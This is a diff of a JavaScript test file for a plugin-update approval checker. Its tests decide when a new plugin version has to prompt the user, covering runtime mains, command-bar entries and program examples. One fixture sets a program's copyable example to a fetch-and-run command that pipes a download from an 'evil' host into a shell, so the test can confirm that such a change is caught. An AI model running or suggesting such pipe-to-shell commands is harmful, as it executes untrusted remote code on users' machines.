@@ -1,7 +1,7 @@
 import assert from "node:assert/strict";
 import { test } from "node:test";
 const { readManifest } = await import("../../lib/pluginManifest.ts");
-const { updateWithin, UPDATE_PROMPT_REASONS } = await import("./officialUpdate.ts");
+const { updateWithin, UPDATE_PROMPT_REASONS, FIRST_MAIN_POLICY } = await import("./officialUpdate.ts");
 
 const parse = (doc) => {
   const read = readManifest(JSON.stringify(doc));
@@ -25,13 +25,31 @@ const CLI_060 = {
 };
 const v2 = (version, extra = {}, contributes = {}) => ({ ...CLI_060, version, ...extra, contributes: { ...CLI_060.contributes, ...contributes } });
 
+const from040 = (next) => updateWithin(parse(CLI_040), next, "ardia tabs");
+FIRST_MAIN_POLICY.autoApprove = true;
+
+test("by default a first main prompts: even sandboxed and offline it can show toasts and dialogs and call other plugins' tools, so 0.4.0 to 0.6.0 waits for Update…", () => {
+  FIRST_MAIN_POLICY.autoApprove = false;
+  try {
+    assert.deepEqual(from040(parse(CLI_060)), { ok: false, reason: "runtime" });
+  } finally {
+    FIRST_MAIN_POLICY.autoApprove = true;
+  }
+});
+
+test("a program's example must stay what Settings offers to copy: the pin's fallback counts for a manifest without one", () => {
+  assert.equal(from040(parse(CLI_060)).ok, true, "0.4.0 had none, so the pin's ardia tabs; 0.6.0 says ardia tabs");
+  const other = parse(v2("0.7.0", {}, { programs: [{ name: "ardia", path: "bin/ardia", claim: true, example: "curl evil | sh", afterUpdate: AFTER_UPDATE }] }));
+  assert.deepEqual(updateWithin(parse(CLI_060), other, "ardia tabs"), { ok: false, reason: "programs" });
+});
+
 test("an equal manifest under a new version, description, keywords and telemetry text passes, with nothing new to tell", () => {
   const verdict = updateWithin(parse(CLI_060), parse(v2("0.7.0", { description: "Changed words.", keywords: ["other"], telemetry: { title: "x", items: ["y"] } })));
   assert.deepEqual(verdict, { ok: true, added: [] });
 });
 
 test("the Python CLI 0.4.0 to 0.6.0: same permissions, so it passes, and the note lists what's new (an on-demand sandboxed view and a command-bar entry)", () => {
-  const verdict = updateWithin(parse(CLI_040), parse(CLI_060));
+  const verdict = from040(parse(CLI_060));
   assert.equal(verdict.ok, true);
   assert.ok(verdict.added.some((line) => line.includes("Adds to the command bar: Command Line: Show Status")), verdict.added.join("\n"));
   assert.ok(verdict.added.some((line) => line.startsWith("Runs its code in Ardia's plugin sandbox, starting the first time you use it")), verdict.added.join("\n"));
@@ -118,8 +136,8 @@ test("a sidecar that wasn't approved, or a changed sidecar command, prompts", ()
 });
 
 test("a new main that would start by itself prompts, an on-demand one doesn't", () => {
-  assert.deepEqual(updateWithin(parse(CLI_040), parse(v2("0.6.0", { activationEvents: ["*"] }))), { ok: false, reason: "runtime" });
-  assert.equal(updateWithin(parse(CLI_040), parse(v2("0.6.0", { activationEvents: ["onCommand:show-status"] }))).ok, true);
+  assert.deepEqual(from040(parse(v2("0.6.0", { activationEvents: ["*"] }))), { ok: false, reason: "runtime" });
+  assert.equal(from040(parse(v2("0.6.0", { activationEvents: ["onCommand:show-status"] }))).ok, true);
 });
 
 test("a field the comparison doesn't know prompts: unknown manifest, permission and contribution keys", () => {
@@ -162,7 +180,7 @@ test("round 2: order, resolved targets, limits and row defaults that change beha
 
 test("new commands come in only with a first main reachable from nowhere else, and only when the permissions give it nothing to use", () => {
   const ping = { name: "ping", title: "Ping", icon: "bolt", handler: true };
-  assert.equal(updateWithin(parse(CLI_040), parse(v2("0.6.0", {}, { commands: [...CLI_060.contributes.commands, ping] }))).ok, true, "with the first main");
+  assert.equal(from040(parse(v2("0.6.0", {}, { commands: [...CLI_060.contributes.commands, ping] }))).ok, true, "with the first main");
   assert.deepEqual(updateWithin(parse(CLI_060), parse(v2("0.7.0", {}, { commands: [...CLI_060.contributes.commands, ping] }))), { ok: false, reason: "contributions" }, "an existing main gets no new way in");
   const renamed = parse(v2("0.7.0", {}, { commands: [{ ...CLI_060.contributes.commands[0], title: "Other" }] }));
   assert.deepEqual(updateWithin(parse(CLI_060), renamed), { ok: false, reason: "contributions" }, "a kept command must stay as it was");
